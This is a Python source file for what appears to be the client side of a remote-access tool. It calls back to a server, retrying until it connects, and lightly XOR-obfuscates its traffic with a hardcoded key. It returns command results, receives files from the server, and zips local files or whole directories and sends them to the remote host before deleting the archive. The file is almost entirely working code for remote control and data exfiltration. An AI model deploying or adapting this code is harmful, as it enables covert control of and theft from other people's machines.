from time import sleep
import socket
import zipfile
import os
from itertools import cycle
import base64

DSIZE = 102400 # Data Size
DELIMETER = "<END_OF_RESULTS>"

class ClientConnection:

     def __init__(self):
        # Create TCP Socket
        self.socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        
     def CreateConnection(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port
        while True:
        	try :
        		self.socket.connect((server_ip, server_port))
        		break;
        	except :
        		print("[-] Retrying ")
        		sleep(2)
        print("[+] Callback Successful!")
      
     def send_data(self, data):
        self.bytedata = self.encryptDecrypt(data,encode=True)
      #   self.bytedata = self.encryptDecrypt(data).encode('utf-8')
        self.socket.send(self.bytedata)

     def recv_data(self):
        self.bytedata = self.socket.recv(DSIZE)
        self.data = self.bytedata.decode('utf-8')
        self.data = self.encryptDecrypt(self.data,decode=True)
        return self.data
                   
     def send_results(self, command_result):
         data_to_send = command_result + DELIMETER
         datainbytes = data_to_send.encode("utf-8")
         self.socket.sendall(datainbytes)
     
     def recv_file(self, filename):
         print(f"[+] Receive {filename}")
         filename = "New" + filename
         with open(filename, 'wb') as file:
             while True:
                 chunk = self.socket.recv(DSIZE)
                 if chunk.endswith(DELIMETER.encode()):
                     chunk = chunk[:-len(DELIMETER)]
                     file.write(chunk)
                     break
                 file.write(chunk)
            
         print("[+] Completed")             
     
     def send_file(self, toDownload):
          print (f"[+] Sending {toDownload}")
          if os.path.isdir(toDownload):
             zipped_name = toDownload + '.zip'
             zipf = zipfile.ZipFile(zipped_name, "w", zipfile.ZIP_DEFLATED)
             
             for root , _, files in os.walk(toDownload):
                for file in files:
                   zipf.write(os.path.join(root,file))
             zipf.close()
  
          else :
             base_name = os.path.basename(toDownload)
             name, _ = os.path.splitext(base_name)
             zipped_name = name +".zip"
             zipf = zipfile.ZipFile(zipped_name,"w")
             zipf.write(base_name)
             zipf.close()
          
          zip_content=b''
          with open(zipped_name,"rb") as file :
                zip_content = file.read()
                file.close()
                
          while True :
                if zip_content == b'':
                   self.socket.send(b'<END_OF_RESULTS>')
                   break
                self.socket.send(zip_content[:DSIZE])
               #  print ("[+] Sending {DSIZE} Bytes")
                zip_content=zip_content[DSIZE:]
                          
         #  print("[+] Bytes Sent")
          
          bytes_to_send = zip_content+DELIMETER.encode()
          self.socket.send(bytes_to_send)
          os.remove(zipped_name)

  
     def encryptDecrypt(self,data, key = 'test', encode = False, decode = False):
        
        xored = ''.join(chr(ord(x) ^ ord(y)) for (x,y) in zip(data, cycle(key)))
         
        if encode:
           return xored.encode('utf-8')
        return xored
             
               
     def end_conn(self):
        self.socket.close()
    
